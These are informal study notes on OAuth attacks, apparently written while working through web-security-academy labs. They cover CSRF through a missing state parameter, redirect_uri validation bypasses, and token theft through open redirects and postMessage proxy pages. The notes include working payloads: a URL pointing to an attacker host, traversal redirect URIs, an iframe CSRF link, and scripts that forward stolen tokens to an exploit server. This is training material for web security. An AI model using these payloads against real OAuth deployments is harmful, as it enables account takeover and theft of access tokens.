## Exploiting OAuth Authentication vulnerabilities
* vulnerability can arise in the client application's implementation of OAuth and configuration of the OAuth service it self.

## vulnerabilities in the OAuth Client Application

### **improper implementation of the implicit grant type.**
* in this flow the access token is sent from OAuth service to the client application via the user's browser as url fragment.
* The trouble is, if the application wants to maintain the session after the user closes the page, it needs to store the current user data somewhere in the server.
* To solve this problem, the client application will often submit this data to the server in a `POST` request and then assign the user a session cookie.
* ```To exploit attacker simply change the parameter send to server for storage and login as victim ```.

### Flawed CSRF Protection
* the state parameter ideally contains unguessable  value , such as hash or something tied to the user's session.
* this value is then passed back and forth between the client application and OAuth service as a form of `CSRF Token` for the client application.
* consider a application that allows users to log in using classic password-based login or by linking their social-media account using OAuth. in this case if the application fail to use `state` parameter, an attacker could potentially hijack a victim's user account.
* In This type of attack we directly login with social media account and forward request until we got `oauth?code=(code)` copy that code and drop the request so we have unused code and we craft `csrf payload that make request to domain.com/oauth-linking?code=(code we generated thorugh our social media account ` and when victim go to our sended link he attach his account with our social media account due to `missing of state ` parameter which prevents CSRF. and we can easily login to their account.

### Leaking Authorization codes and access Token
* Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri`
* see all request and analyze authorization request.
* see if this contain `redirect_uri` parameter which redirect the user with authorization code.
* we craft `CSRF PAYLOAD` and send it to victim and if victim have active session he redirect to our exploit server with `authorization code` and we can replace it with our and we have full control of victim account.

### Flawed redirect_uri validation
* best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service.
* so it can validate the `redirect_uri` parameter against this whitelist and if not in whitelist it can give error.
#### but this can be bypassed
* Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
* You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate `redirect_uri` parameters as follows:  
```js
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
```
* Some servers also give special treatment to `localhost` URIs as they're often used during development. In some cases, any redirect URI beginning with `localhost` may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as `localhost.evil-user.net`.
* we need to experiment with other parameters to change it, it may affect other parameter's validation eg. changing `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri` and we bypass blocking.

### Stealing Codes and Access Token via a Proxy Page
* Against more robust targets, you might find that no matter what you try, you are unable to successfully submit an external domain as the `redirect_uri`.
* try to work out whether you can change the `redirect_uri` parameter to point to any other pages on a whitelisted domain.
* Try to find ways that you can successfully access different subdomains or paths or use `Directory traversal ` tricks to supply any arbitrary path on the domain.
```js
https://client-app.com/oauth/callback/../../example/path
```
* once we have identified which other pages are able to set as `redirect URI` we audit them for additional vulnerabilities that you can leak the code.
* For the `authorization code flow`, you need to find a vulnerability that gives you access to the query parameters.
* for the `implicit grant type`, you need to extract the URL fragment.
* one of the most usefull vulnerability for this purpose is an `Open Redirect`, we can use this as proxy to forward victims along with their code to attacker controlled domain.

`NOTE that for the implicit grant type, stealing an access token doesn't just enable you to log in to the victim's account on the client application. As the entire implicit flow takes place via the browser, you can also use the token to make your own API calls to the OAuth service's resource server. This may enable you to fetch sensitive user data that you cannot normally access from the client application's web UI.`

### Stealing OAuth Token via an open Redirect.
* see the authorization request's `redirect_uri` parameter we cant change it to exploit server but we can check `Directory traversal vuln` and check `/../`
* this is vulnerable to directory traversal
* and we find any web request that point to another url or directory 
* `/post/next?path=(here we put our exploit server uri)` and it redirects us to exploit server with OAuth Token.
* we make an script that execute so we get their token in the access log of our server
```js
<script>
window.location='/?'+document.location.hash.substr(1)
</script>
```
* some application make another request with authorization header to retrieve the information so we attach victim authorization code with this request and we got victims info including API keys.

### Stealing OAuth access token via a Proxy page
* since we dint able to make redirect_uri to make external call
* we analyse the application and find any other vulnerability we can take advantage of that.
* here we have vulnerable in comment section that  `/post/comment/comment-form` page in Burp and notice that it uses the `postMessage()` method to send the `window.location.href` property to its parent window. Crucially, it allows messages to be posted to any origin (`*`).
* final csrf link is 
```js
<iframe src="https://YOUR-LAB-AUTH-SERVER/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
```
`<script>  
  window.addEventListener('message', function(e) {  
    fetch("/" + encodeURIComponent(e.data.data))  
  }, false)  
</script` this script listen web message in the exploit server and revel the message.
